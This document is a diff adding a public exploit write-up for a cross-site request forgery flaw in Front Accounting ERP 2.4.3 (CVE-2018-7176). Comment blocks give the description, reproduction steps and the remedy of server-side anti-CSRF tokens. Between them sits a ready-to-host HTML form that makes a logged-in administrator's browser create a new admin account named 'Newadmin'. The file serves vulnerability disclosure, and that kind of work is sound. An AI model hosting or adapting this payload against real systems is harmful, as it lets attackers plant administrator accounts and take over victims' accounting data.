@@ -1,0 +1,57 @@
+<!--
+​​# Exploit Title: Front Accounting ERP 2.4.3 - CSRF
+# Date: 16-02-2018
+# Exploit Author: Samrat Das
+# Contact: http://twitter.com/Samrat_Das93
+# Website: https://securitywarrior9.blogspot.in/
+# Vendor Homepage: frontaccounting.com
+# Version: 2.4.3
+# CVE : CVE-2018-7176
+# Category: WebApp ERP
+
+1. Description
+
+The application source code is coded in a way which allows malicious
+crafted HTML page to be executed directly without any anti csrf
+countermeasures.
+
+2. Proof of Concept
+
+1.       Visit the application
+2.       Visit the User Permissions Page.
+3.        Goto add user, and create a csrf crafted exploit for the same ,
+upon hosting it on a server and sending the link to click by victim, it
+gets exploited.
+
+Proof of Concept
+
+Steps to Reproduce:
+
+1. Create an HTML Page with the below exploit code:
+-->
+
+<html>
+ <body>
+    <form action="
+http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml"
+method="POST" enctype="text/plain">
+      <input type="hidden" name="show&#95;inactive"
+value="&user&#95;id&#61;Newadmin&password&#61;Newadmin&real&#95;name&#61;New&#37;20Admin&phone&#61;&email&#61;&role&#95;id&#61;8&language&#61;C&pos&#61;1&print&#95;profile&#61;&rep&#95;popup&#61;1&ADD&#95;ITEM&#61;Add&#37;20new&&#95;focus&#61;user&#95;id&&#95;modified&#61;0&&#95;confirmed&#61;&&#95;token&#61;Ta6aiT2xqlL2vg8u9aAvagxx&&#95;random&#61;757897&#46;6552143205"
+/>
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+<!--
+2  This hosted page upon being clicked by an logged in admin user will lead
+to creation of a new malicious admin user.
+
+3 POCs and steps:
+https://securitywarrior9.blogspot.in/2018/02/cross-site-request-forgery-front.html
+
+4. Solution:
+
+Implement anti csrf token code in state changing http requests and validate
+it at server side.
+-->
